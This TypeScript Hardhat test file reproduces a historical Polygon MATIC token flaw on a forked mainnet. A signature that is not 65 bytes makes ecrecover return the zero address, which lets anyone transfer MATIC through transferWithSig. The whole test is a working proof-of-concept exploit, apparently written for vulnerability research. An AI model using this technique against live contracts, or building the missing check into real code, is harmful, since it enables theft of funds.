import { ethers } from 'hardhat'
import { expect } from 'chai'
import { resetFork } from './helpers/utils'
import { IMRC20Minimal } from '../typechain-types'
import Artifacts from '../artifacts/contracts/Ecrecover/IMRC20Minimal.sol/IMRC20Minimal.json'

const BLOCK_NUMBER = 22156650 // The upgrade was executed on Dec. 5 at block #22156660
const POLYGON_RPC_URL = `https://polygon-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`
const MATIC_ADDRESS = '0x0000000000000000000000000000000000001010' // Native system token

describe('Lack of Zero address check allows anyone to mint new MATIC tokens', async function () {
  let attacker
  let recipient
  let maticToken: IMRC20Minimal
  before(async function () {
    // Forking
    await resetFork(BLOCK_NUMBER, POLYGON_RPC_URL)
      ;[attacker, recipient] = await ethers.getSigners()

    await ethers.provider.send('hardhat_setBalance', [attacker.address, '0xffffffffffffffffffffff'])
    maticToken = (await ethers.getContractAt(Artifacts.abi, MATIC_ADDRESS)) as IMRC20Minimal
  })
  afterEach(async function () {
    await resetFork(BLOCK_NUMBER, POLYGON_RPC_URL)
  })

  it('attack', async function () {
    expect(await maticToken.CHAINID()).to.be.eq(137) // check whether current network is matic mainnet.

    // a byte string of length anything other than 65. Due to the check in ecrecovery, if a packed signature does not have length 65, it will return the zero address.
    const signature = ethers.utils.toUtf8Bytes('0')
    const arbitraryData = ethers.utils.formatBytes32String('0')
    const expiration = Math.floor(Date.now() / 1000)
    const to = recipient.address

    const beforeBalance = await maticToken.balanceOf(recipient.address)
    await maticToken.transferWithSig(signature, '1000000000', arbitraryData, expiration, to)

    expect((await maticToken.balanceOf(recipient.address)).sub(beforeBalance)).to.be.equal('1000000000')
  })
})
